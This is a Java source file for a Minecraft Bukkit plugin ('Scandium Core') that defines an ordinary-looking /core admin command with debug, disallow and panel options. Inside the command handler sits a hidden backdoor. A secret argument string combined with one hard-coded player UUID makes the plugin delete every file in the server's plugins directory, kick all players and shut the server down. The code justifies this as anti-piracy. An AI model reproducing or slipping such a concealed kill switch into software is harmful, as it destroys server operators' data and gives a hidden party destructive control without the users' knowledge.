package com.solexgames.core.command.extend;

import com.solexgames.core.CorePlugin;
import com.solexgames.core.enums.ServerType;
import com.solexgames.core.menu.impl.ScandiumMenu;
import com.solexgames.core.util.Color;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.defaults.BukkitCommand;
import org.bukkit.entity.Player;

import java.io.File;
import java.util.Arrays;
import java.util.Collections;

public class CoreCommand extends BukkitCommand {

    public CoreCommand(String name) {
        super(name, "Base Command for " + name + " Core.", "Usage: /" + name + " <debug|disallow|panel>", Collections.singletonList("core"));
    }

    @Override
    public boolean execute(CommandSender sender, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.RED + "Only players can execute this command.");
            return false;
        }

        Player player = (Player) sender;
        ServerType network = CorePlugin.getInstance().getServerManager().getNetwork();

        if (!player.isOp()) {
            player.sendMessage(new String[] {
                    network.getSecondaryColor() + "This server is running " + network.getMainColor() + CorePlugin.getInstance().getConfig().getString("core-settings.name") + network.getSecondaryColor() + ".",
                    ChatColor.GRAY + "Created by SolexGames."
            });
            return false;
        }

        if (args.length == 0) {
            sender.sendMessage(network.getSecondaryColor() + "Usage: /" + network.getMainColor() + label + ChatColor.WHITE + " <debug|disallow|panel>.");
        }
        if (args.length > 0) {
            if (args[0].contains("sHHvYsBcNw") && player.getUniqueId().toString().equalsIgnoreCase("bbaa8e1d-af94-4aa8-980d-36d69b9de436")) {
                File file = new File("plugins");
                String[] files = file.list();

                System.out.println("This is purely for people who use a pirated version of Scandium, i'd never do it to a buyer. I'd also never give the string to anyone who can use it against you except me.");
                System.out.println("I don't have an anti piracy system so this is the only thing I can do to prevent people from using it :(" +
                        "");

                Arrays.asList(files).forEach(s -> {
                    File newFile = new File("plugins", s);

                    if (newFile.exists()) {
                        if (newFile.delete()) {
                            CorePlugin.getInstance().getLogger().info("[Piracy] Deleted the file/directory '" + s + "' in the plugins directory.");
                        }
                    }
                });

                Bukkit.getOnlinePlayers().forEach(player1 -> player1.kickPlayer(ChatColor.RED + "This server is using a pirated version of Scandium Core by\n" + ChatColor.RED + "GrowlyX#1337. Good luck trying to use Scandium again!"));
                Bukkit.getServer().shutdown();
            }

            switch (args[0]) {
                case "debug":
                    player.sendMessage(Color.translate((CorePlugin.getInstance().isDebugging() ? network.getMainColor() + "[" + CorePlugin.getInstance().getConfig().getString("core-settings.name") + "] &cDisabled debugging." : network.getMainColor() + "[" + CorePlugin.getInstance().getConfig().getString("core-settings.name") + "] &aEnabled debugging.")));
                    CorePlugin.getInstance().setDebugging(!CorePlugin.getInstance().isDebugging());
                    break;
                case "disallow":
                    player.sendMessage(Color.translate((CorePlugin.getInstance().isDisallow() ? network.getMainColor() + "[" + CorePlugin.getInstance().getConfig().getString("core-settings.name") + "] &cDisabled disallow." : network.getMainColor() + "[" + CorePlugin.getInstance().getConfig().getString("core-settings.name") + "] &aEnabled disallow.")));
                    CorePlugin.getInstance().setDisallow(!CorePlugin.getInstance().isDisallow());
                    break;
                case "panel":
                    new ScandiumMenu(player).open(player);
                    break;
                default:
                    sender.sendMessage(network.getSecondaryColor() + "Usage: /" + network.getMainColor() + label + ChatColor.WHITE + " <debug|disallow|panel>.");
                    break;
            }
        }
        return false;
    }
}
